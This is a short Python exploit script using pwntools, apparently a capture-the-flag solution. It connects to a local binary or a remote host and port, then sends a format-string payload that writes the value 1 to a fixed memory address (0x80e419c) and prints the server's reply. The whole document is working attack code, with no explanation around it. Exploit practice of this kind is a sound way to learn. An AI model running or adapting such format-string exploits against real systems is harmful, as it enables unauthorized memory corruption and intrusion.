#!/usr/bin/python3
import pwn, sys

if __name__ == '__main__':
    target = None

    if len(sys.argv) != 3:
        target = pwn.process(sys.argv[1])  # Use local file
    else:
        server = sys.argv[1]
        port = int(sys.argv[2])
        target = pwn.remote(server, port)  # Connect to the server

    attack = pwn.fmtstr_payload(4, { 0x80e419c: 1 })
    target.sendline(attack)
    a = target.recvuntil(b':')
    print(target.recvall().decode("utf-8", "ignore").strip())
